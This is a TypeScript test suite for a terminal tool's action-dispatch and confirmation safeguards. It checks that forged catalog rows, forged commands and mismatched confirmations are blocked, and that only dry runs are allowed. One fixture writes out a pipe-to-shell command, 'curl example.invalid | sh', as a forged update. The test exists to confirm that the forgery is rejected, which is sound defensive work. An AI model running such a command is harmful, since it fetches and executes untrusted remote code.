import { describe, expect, test } from "bun:test";
import {
	createActionPreviewPlan,
	getActionCatalog,
	submitActionPreviewConfirmation,
} from "../src/core/actions";
import type { ControlExecutionResult } from "../src/core/controlExecution";
import {
	classifyControlExecutionFailure,
	classifyControlExecutionResult,
	getActionMetadataBlockers,
	prepareActionDispatch,
	prepareControlConfirmationPrompt,
	prepareControlExecutionStart,
	prepareControlExecutionTransition,
	prepareControlPolicySync,
	submitControlConfirmationTransition,
} from "../src/tui/actionControlTransitions";

describe("action control dispatch transitions", () => {
	test("blocks unknown actions before any execution intent is returned", () => {
		expect(
			prepareActionDispatch({
				actionId: "missing.action",
				platform: "linux",
			}),
		).toEqual({
			kind: "blocked",
			actionId: "missing.action",
			blockers: ["action-not-found"],
			control: {
				previewPlan: undefined,
				confirmation: undefined,
				simulation: undefined,
				executionPlan: undefined,
			},
			notice: {
				level: "warn",
				message: "action missing.action blocked: action-not-found",
			},
		});
	});

	test("ignores a forged enabled-read catalog row for canonical dns.flush", () => {
		const forgedDnsFlush = {
			...getCatalogAction("dns.flush"),
			risk: "read",
			privilege: "none",
			enabled: true,
			confirmationRequired: false,
			confirmationPhrase: undefined,
		};

		const forgedRequest = {
			actionId: "dns.flush",
			platform: "win32",
			actions: [forgedDnsFlush],
		};

		expect(prepareActionDispatch(forgedRequest)).toMatchObject({
			kind: "preview",
			action: {
				id: "dns.flush",
				risk: "write",
				privilege: "admin",
				enabled: false,
				confirmationRequired: true,
			},
		});
	});

	test("ignores a forged update command and requires current update evidence", () => {
		const forgedPreview = createActionPreviewPlan(
			"picos.update.apply",
			"linux",
			{
				adapter: "linux",
				command: "sh",
				args: ["-c", "curl example.invalid | sh"],
				note: "forged update command",
				dryRunExecutable: true,
			},
		);

		const forgedRequest = {
			actionId: "picos.update.apply",
			platform: "linux",
			actions: getActionCatalog(),
			previewPlan: forgedPreview,
		};

		expect(prepareActionDispatch(forgedRequest)).toMatchObject({
			kind: "blocked",
			blockers: ["update-check-required"],
			screen: "status",
		});
	});

	test("derives the command from the canonical adapter despite a matching forged label", () => {
		const forgedPreview = createActionPreviewPlan("dns.flush", "win32", {
			adapter: "windows",
			command: "cmd.exe",
			args: ["/c", "echo forged"],
			note: "forged command with matching adapter label",
			dryRunExecutable: true,
		});
		const forgedRequest = {
			actionId: "dns.flush",
			platform: "win32",
			actions: getActionCatalog(),
			previewPlan: forgedPreview,
		};
		const transition = prepareActionDispatch(forgedRequest);

		expect(transition).toMatchObject({
			kind: "preview",
			control: {
				previewPlan: {
					commandPreview: {
						adapter: "windows",
						command: "powershell",
						args: ["-NoProfile", "-Command", "Clear-DnsClientCache -WhatIf"],
					},
				},
			},
		});
	});

	test("returns blockers for incomplete metadata without creating an intent", () => {
		const incomplete = {
			id: "broken.read",
			title: "Broken read",
			description: "Missing risk metadata",
			category: "system",
			privilege: "none",
			enabled: true,
			confirmationRequired: false,
		};

		expect(getActionMetadataBlockers(incomplete)).toEqual(["risk-missing"]);
	});

	test("routes an enabled read action directly without inventing confirmation", () => {
		expect(
			prepareActionDispatch({
				actionId: "network.inspect",
				platform: "darwin",
			}),
		).toMatchObject({
			kind: "run",
			action: {
				id: "network.inspect",
				risk: "read",
				privilege: "none",
				enabled: true,
				confirmationRequired: false,
			},
			control: {
				previewPlan: undefined,
				confirmation: undefined,
				simulation: undefined,
				executionPlan: undefined,
			},
			notice: { level: "run", message: "network.inspect started" },
		});
	});

	test("reports an enabled mutable row through the blocker-only validator", () => {
		const mutable = {
			...getCatalogAction("dns.flush"),
			enabled: true,
		};

		expect(getActionMetadataBlockers(mutable)).toEqual([
			"mutable-action-enabled",
		]);
	});

	test("blocks disabled read actions and mutable actions without exact confirmation metadata", () => {
		expect(
			prepareActionDispatch({
				actionId: "remote.sftp.connect",
				platform: "linux",
			}),
		).toMatchObject({
			kind: "blocked",
			blockers: ["action-disabled"],
		});

		const missingPhrase = {
			...getCatalogAction("dns.flush"),
			confirmationPhrase: undefined,
		};
		expect(getActionMetadataBlockers(missingPhrase)).toEqual([
			"confirmation-phrase-missing",
		]);
	});

	test("blocks unsupported platforms and missing adapter-owned previews", () => {
		expect(
			prepareActionDispatch({
				actionId: "dns.flush",
				platform: "freebsd",
			}),
		).toMatchObject({
			kind: "blocked",
			blockers: ["unsupported-platform"],
		});
		expect(
			prepareActionDispatch({
				actionId: "files.write",
				platform: "linux",
			}),
		).toMatchObject({
			kind: "blocked",
			blockers: ["adapter-command-missing"],
		});
	});

	test("returns blockers for malformed primitive metadata without throwing", () => {
		expect(getActionMetadataBlockers(42)).toEqual([
			"action-metadata-incomplete",
		]);
		expect(
			getActionMetadataBlockers({
				...getCatalogAction("dns.flush"),
				confirmationPhrase: 123,
			}),
		).toEqual(["confirmation-phrase-missing"]);
	});

	test("opens a complete locked mutation preview without enabling execution", () => {
		const transition = prepareActionDispatch({
			actionId: "dns.flush",
			platform: "win32",
		});

		expect(transition).toMatchObject({
			kind: "preview",
			action: {
				id: "dns.flush",
				risk: "write",
				privilege: "admin",
				enabled: false,
			},
			screen: "actions",
			control: {
				previewPlan: {
					actionId: "dns.flush",
					dryRun: true,
					confirmationPhrase: "flush dns",
					commandPreview: { adapter: "windows", dryRunExecutable: true },
				},
				confirmation: undefined,
				simulation: {
					actionId: "dns.flush",
					status: "blocked-by-policy",
					executionEnabled: false,
				},
				executionPlan: undefined,
			},
		});
		expect(transition.notice.message).toContain(
			"control preview dns.flush risk=write privilege=admin dryRun=true",
		);
	});

	test("keeps update apply in its feature-owner status handoff until update evidence exists", () => {
		expect(
			prepareActionDispatch({
				actionId: "picos.update.apply",
				platform: "linux",
			}),
		).toMatchObject({
			kind: "blocked",
			blockers: ["update-check-required"],
			screen: "status",
			notice: {
				level: "warn",
				message: "run picos.update before opening update apply preview",
			},
		});
	});

	test("preserves the focused Actions handoff when update apply evidence is available", () => {
		expect(
			prepareActionDispatch({
				actionId: "picos.update.apply",
				platform: "linux",
				updateCheckResult: {
					packageName: "@uulab/picos",
					currentVersion: "0.2.0",
					latestVersion: "0.3.0",
					status: "update-available",
					registryUrl: "https://registry.npmjs.org/@uulab%2Fpicos/latest",
				},
			}),
		).toMatchObject({
			kind: "preview",
			screen: "actions",
			focusArea: "actions",
			control: {
				previewPlan: {
					actionId: "picos.update.apply",
					commandPreview: {
						adapter: "linux",
						dryRunExecutable: true,
					},
				},
			},
		});
	});
});

describe("action control confirmation transitions", () => {
	const preview = createActionPreviewPlan("dns.flush", "win32", {
		adapter: "windows",
		command: "powershell",
		args: ["-NoProfile", "-Command", "Clear-DnsClientCache -WhatIf"],
		note: "flush local DNS resolver cache with WhatIf preview",
		dryRunExecutable: true,
	});

	test("advertises confirmation only for a complete locked mutable preview", () => {
		expect(
			prepareControlConfirmationPrompt({
				previewPlan: undefined,
				platform: "win32",
			}),
		).toEqual({
			kind: "blocked",
			notice: {
				level: "warn",
				message: "control confirmation needs a locked action preview first",
			},
		});
		expect(
			prepareControlConfirmationPrompt({
				previewPlan: preview,
				platform: "win32",
			}),
		).toEqual({
			kind: "prompt",
			prompt: "control-confirm",
			notice: {
				level: "info",
				message: "control confirmation opened for dns.flush",
			},
		});
	});

	test("rejects absent or mismatched confirmation without execution", () => {
		expect(
			submitControlConfirmationTransition({
				previewPlan: undefined,
				platform: "win32",
				input: "",
			}),
		).toEqual({
			kind: "blocked",
			closeCommandLine: true,
			notices: [
				{
					level: "warn",
					message: "control confirmation missing preview",
				},
			],
		});

		const rejected = submitControlConfirmationTransition({
			previewPlan: preview,
			platform: "win32",
			input: "flush cache",
		});
		expect(rejected).toMatchObject({
			kind: "confirmation",
			closeCommandLine: true,
			confirmation: { confirmed: false, status: "rejected" },
			simulation: { executionEnabled: false },
			executionPlan: undefined,
			notices: [{ level: "fail" }, { level: "warn" }],
		});
	});

	test("records an exact confirmation but keeps mutation execution disabled", () => {
		const accepted = submitControlConfirmationTransition({
			previewPlan: preview,
			platform: "win32",
			input: " flush dns ",
		});
		expect(accepted).toMatchObject({
			kind: "confirmation",
			confirmation: {
				expectedPhrase: "flush dns",
				receivedPhrase: "flush dns",
				confirmed: true,
				executionEnabled: false,
			},
			simulation: {
				confirmed: true,
				executionEnabled: false,
			},
			notices: [{ level: "warn" }, { level: "warn" }],
		});
	});

	test("blocks malformed phrase and command primitives without throwing", () => {
		if (!preview?.commandPreview) {
			throw new Error("expected canonical preview fixture");
		}
		const malformed = {
			...preview,
			confirmationPhrase: 123,
			commandPreview: {
				...preview.commandPreview,
				command: 456,
			},
		};
		let transition:
			| ReturnType<typeof prepareControlConfirmationPrompt>
			| undefined;

		expect(() => {
			transition = prepareControlConfirmationPrompt({
				previewPlan: malformed,
				platform: "win32",
			});
		}).not.toThrow();
		expect(transition).toMatchObject({
			kind: "blocked",
			notice: {
				level: "warn",
				message:
					"control confirmation dns.flush blocked: preview-canonical-mismatch",
			},
		});
	});
});

describe("control execution token publication", () => {
	const preview = createActionPreviewPlan("dns.flush", "win32", {
		adapter: "windows",
		command: "powershell",
		args: ["-NoProfile", "-Command", "Clear-DnsClientCache -WhatIf"],
		note: "flush local DNS resolver cache with WhatIf preview",
		dryRunExecutable: true,
	});
	const confirmed = preview
		? submitControlConfirmationTransition({
				previewPlan: preview,
				platform: "win32",
				input: "flush dns",
			})
		: undefined;

	test("advances the shared control token before a config policy sync publishes", () => {
		const sync = prepareControlPolicySync({
			currentToken: 4,
			policy: { mode: "disabled", allowAdminDryRun: false },
		}) as {
			requestToken: number;
			policy: { mode: "disabled" | "dry-run"; allowAdminDryRun: boolean };
		};

		expect(sync).toEqual({
			requestToken: 5,
			policy: { mode: "disabled", allowAdminDryRun: false },
		});
		expect(
			prepareControlExecutionTransition({
				previewPlan: undefined,
				confirmation: undefined,
				platform: "win32",
				policy: sync.policy,
				requestToken: 4,
				currentToken: sync.requestToken,
			}),
		).toEqual({ kind: "stale", publishCurrent: false });
	});

	test("does not publish a stale execution plan after config policy I/O", () => {
		if (!preview || !confirmed || confirmed.kind !== "confirmation") {
			throw new Error("expected confirmed preview fixture");
		}
		expect(
			prepareControlExecutionTransition({
				previewPlan: preview,
				confirmation: confirmed.confirmation,
				platform: "win32",
				policy: { mode: "dry-run", allowAdminDryRun: true },
				requestToken: 1,
				currentToken: 2,
			}),
		).toEqual({ kind: "stale", publishCurrent: false });
	});

	test("guards missing previews before requesting config policy I/O", () => {
		expect(
			prepareControlExecutionStart({
				previewPlan: undefined,
				platform: "win32",
			}),
		).toEqual({
			kind: "blocked",
			notice: {
				level: "warn",
				message: "control execution needs a locked action preview first",
			},
		});
		expect(
			prepareControlExecutionStart({
				previewPlan: preview,
				platform: "win32",
			}),
		).toEqual({
			kind: "read-policy",
			actionId: "dns.flush",
			io: { kind: "read-control-policy" },
		});
	});

	test("returns an adapter execution intent only for the owning token", () => {
		if (!preview || !confirmed || confirmed.kind !== "confirmation") {
			throw new Error("expected confirmed preview fixture");
		}
		const transition = prepareControlExecutionTransition({
			previewPlan: preview,
			confirmation: confirmed.confirmation,
			platform: "win32",
			policy: { mode: "dry-run", allowAdminDryRun: true },
			requestToken: 3,
			currentToken: 3,
		});
		expect(transition).toMatchObject({
			kind: "execute",
			publishCurrent: true,
			executionPlan: {
				actionId: "dns.flush",
				status: "dry-run-ready",
				willExecute: true,
			},
			io: { kind: "run-control-execution" },
		});
	});

	test("blocks execution after the confirmed preview command args are mutated", () => {
		const dispatch = prepareActionDispatch({
			actionId: "dns.flush",
			platform: "win32",
		});
		const mutablePreview = dispatch.control.previewPlan;
		const commandPreview = mutablePreview?.commandPreview;
		if (dispatch.kind !== "preview" || !mutablePreview || !commandPreview) {
			throw new Error("expected canonical dispatch preview");
		}
		const accepted = submitControlConfirmationTransition({
			previewPlan: mutablePreview,
			platform: "win32",
			input: "flush dns",
		});
		if (accepted.kind !== "confirmation") {
			throw new Error("expected bound confirmation");
		}
		commandPreview.args[2] = "Write-Output forged";

		expect(
			prepareControlExecutionTransition({
				previewPlan: mutablePreview,
				confirmation: accepted.confirmation,
				platform: "win32",
				policy: { mode: "dry-run", allowAdminDryRun: true },
				requestToken: 4,
				currentToken: 4,
			}),
		).toEqual({
			kind: "blocked",
			publishCurrent: true,
			notice: {
				level: "warn",
				message:
					"control execution dns.flush blocked: preview-canonical-mismatch",
			},
		});
	});

	test("blocks a forged matching preview and confirmation pair", () => {
		const forgedPreview = createActionPreviewPlan("dns.flush", "win32", {
			adapter: "windows",
			command: "cmd.exe",
			args: ["/c", "echo forged"],
			note: "forged matching pair",
			dryRunExecutable: true,
		});
		if (!forgedPreview) {
			throw new Error("expected forged preview fixture");
		}
		const forgedConfirmation = {
			...submitActionPreviewConfirmation(forgedPreview, "flush dns"),
			previewFingerprint: "forged-matching-pair",
		};

		expect(
			prepareControlExecutionTransition({
				previewPlan: forgedPreview,
				confirmation: forgedConfirmation,
				platform: "win32",
				policy: { mode: "dry-run", allowAdminDryRun: true },
				requestToken: 5,
				currentToken: 5,
			}),
		).toEqual({
			kind: "blocked",
			publishCurrent: true,
			notice: {
				level: "warn",
				message:
					"control execution dns.flush blocked: preview-canonical-mismatch",
			},
		});
	});

	test("blocks execution when confirmation belongs to a different action", () => {
		if (!preview || !confirmed || confirmed.kind !== "confirmation") {
			throw new Error("expected confirmed preview fixture");
		}
		expect(
			prepareControlExecutionTransition({
				previewPlan: preview,
				confirmation: {
					...confirmed.confirmation,
					actionId: "route.add",
				},
				platform: "win32",
				policy: { mode: "dry-run", allowAdminDryRun: true },
				requestToken: 4,
				currentToken: 4,
			}),
		).toEqual({
			kind: "blocked",
			publishCurrent: true,
			notice: {
				level: "warn",
				message:
					"control execution dns.flush blocked: confirmation-action-mismatch",
			},
		});
	});

	test("blocks a confirmed execution when its exact phrase differs from the preview", () => {
		if (!preview || !confirmed || confirmed.kind !== "confirmation") {
			throw new Error("expected confirmed preview fixture");
		}
		expect(
			prepareControlExecutionTransition({
				previewPlan: preview,
				confirmation: {
					...confirmed.confirmation,
					expectedPhrase: "flush resolver",
					receivedPhrase: "flush resolver",
				},
				platform: "win32",
				policy: { mode: "dry-run", allowAdminDryRun: true },
				requestToken: 5,
				currentToken: 5,
			}),
		).toEqual({
			kind: "blocked",
			publishCurrent: true,
			notice: {
				level: "warn",
				message:
					"control execution dns.flush blocked: confirmation-preview-mismatch",
			},
		});
	});

	test("blocks a confirmed execution when its adapter command differs from the preview", () => {
		if (!preview || !confirmed || confirmed.kind !== "confirmation") {
			throw new Error("expected confirmed preview fixture");
		}
		const commandPreview = confirmed.confirmation.commandPreview;
		if (!commandPreview) {
			throw new Error("expected adapter command fixture");
		}
		expect(
			prepareControlExecutionTransition({
				previewPlan: preview,
				confirmation: {
					...confirmed.confirmation,
					commandPreview: {
						...commandPreview,
						command: "cmd.exe",
					},
				},
				platform: "win32",
				policy: { mode: "dry-run", allowAdminDryRun: true },
				requestToken: 6,
				currentToken: 6,
			}),
		).toEqual({
			kind: "blocked",
			publishCurrent: true,
			notice: {
				level: "warn",
				message:
					"control execution dns.flush blocked: confirmation-preview-mismatch",
			},
		});
	});

	test("keeps stale failures as history without publishing current output", () => {
		const result: ControlExecutionResult = {
			success: false,
			audit: {
				actionId: "dns.flush",
				status: "dry-run-failed",
				policy: "dry-run",
				confirmed: true,
				dryRun: true,
				willExecute: true,
				adapter: "windows",
				command: "powershell -NoProfile -Command Clear-DnsClientCache -WhatIf",
				blockers: [],
			},
			stderr: "access denied",
			error: "access denied",
		};
		expect(
			classifyControlExecutionResult({
				result,
				requestToken: 4,
				currentToken: 5,
			}),
		).toEqual({
			publication: "stale",
			publishCurrent: false,
			historyNotice: {
				level: "fail",
				message:
					'control execution dns.flush status=dry-run-failed policy=dry-run confirmed=true dryRun=true willExecute=true adapter=windows command="powershell -NoProfile -Command Clear-DnsClientCache -WhatIf" publication=stale',
			},
			currentNotices: [],
		});
	});

	test("does not publish stale successes and publishes current output only for its owner", () => {
		const result: ControlExecutionResult = {
			success: true,
			audit: {
				actionId: "dns.flush",
				status: "dry-run-executed",
				policy: "dry-run",
				confirmed: true,
				dryRun: true,
				willExecute: true,
				adapter: "windows",
				command: "powershell -NoProfile -Command Clear-DnsClientCache -WhatIf",
				blockers: [],
			},
			stdout: "What if: Clear-DnsClientCache",
		};
		expect(
			classifyControlExecutionResult({
				result,
				requestToken: 6,
				currentToken: 7,
			}),
		).toMatchObject({
			publication: "stale",
			publishCurrent: false,
			currentNotices: [],
		});
		expect(
			classifyControlExecutionResult({
				result,
				requestToken: 7,
				currentToken: 7,
			}),
		).toMatchObject({
			publication: "current",
			publishCurrent: true,
			historyNotice: { level: "ok" },
			currentNotices: [
				{
					level: "info",
					message: "control dry-run stdout What if: Clear-DnsClientCache",
				},
			],
		});
	});

	test("classifies thrown stale failures as history-only evidence", () => {
		expect(
			classifyControlExecutionFailure({
				actionId: "dns.flush",
				error: new Error("runner exploded"),
				requestToken: 8,
				currentToken: 9,
			}),
		).toEqual({
			publication: "stale",
			publishCurrent: false,
			historyNotice: {
				level: "fail",
				message:
					"control execution dns.flush failed runner exploded publication=stale",
			},
		});
	});

	test("blocks an execution attempt without a preview", () => {
		const transition = prepareControlExecutionTransition({
			previewPlan: undefined,
			confirmation: undefined,
			platform: "win32",
			policy: { mode: "disabled", allowAdminDryRun: false },
			requestToken: 10,
			currentToken: 10,
		});
		expect(transition).toEqual({
			kind: "blocked",
			publishCurrent: true,
			notice: {
				level: "warn",
				message: "control execution needs a locked action preview first",
			},
		});
	});
});

function getCatalogAction(actionId: string) {
	const action = getActionCatalog().find(
		(candidate) => candidate.id === actionId,
	);
	if (!action) {
		throw new Error(`expected ${actionId} action fixture`);
	}
	return action;
}
